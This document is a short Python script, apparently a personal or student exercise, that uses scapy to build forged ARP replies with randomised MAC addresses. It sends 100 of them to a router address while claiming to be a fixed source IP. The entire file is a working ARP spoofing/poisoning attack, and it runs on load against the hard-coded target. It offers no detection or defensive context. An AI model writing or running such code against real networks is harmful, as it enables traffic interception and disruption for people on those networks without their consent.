import random
from scapy.all import *
def randomMAC():
	n7 = random.randint(0x00, 0xff)
	while 1:
		if n7%2 != 0:
			n7 = random.randint(0x00, 0xff)
		else:
			break
			
    	return [ n7, 
	random.randint(0x00, 0xff),
	random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]



def randomIPsource():
	a = random.randint(1,254)
	b = random.randint(1,254)
 	c = random.randint(1,254)
	d = random.randint(1,254)
	return [a,b,c,d]
def formatoMAC(mac):
	  return("%02x"%mac[0]+":"+
		"%02x"%mac[1]+":"+
		"%02x"%mac[2]+":"+
		"%02x"%mac[3]+":"+
		"%02x"%mac[4]+":"+
		"%02x"%mac[5])

def formatoIP(ip):
	return (str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3]))

def arpPoising1(ipTarget, nPackages):
	
	for i in range(nPackages):
		mac = formatoMAC(randomMAC())	
		send(ARP(hwsrc = mac, pdst = ipTarget, psrc ="172.24.117.135" ), iface="wlo1")
		
def arpPoising2(ipTarget, nPackages):
	list = []
	for i in range(nPackages):
		mac = formatoMAC(randomMAC())
		list.append(ARP(hwsrc = mac, pdst = ipTarget, psrc ="172.24.117.135"))
	
	send(list, iface="wlo1")
		

ipTarget = "192.168.0.1"
nMessages = 100

#print(formatoIP(randomIPsource()))
#arpPoising1(ipTarget,nMessages)
arpPoising2(ipTarget,nMessages)




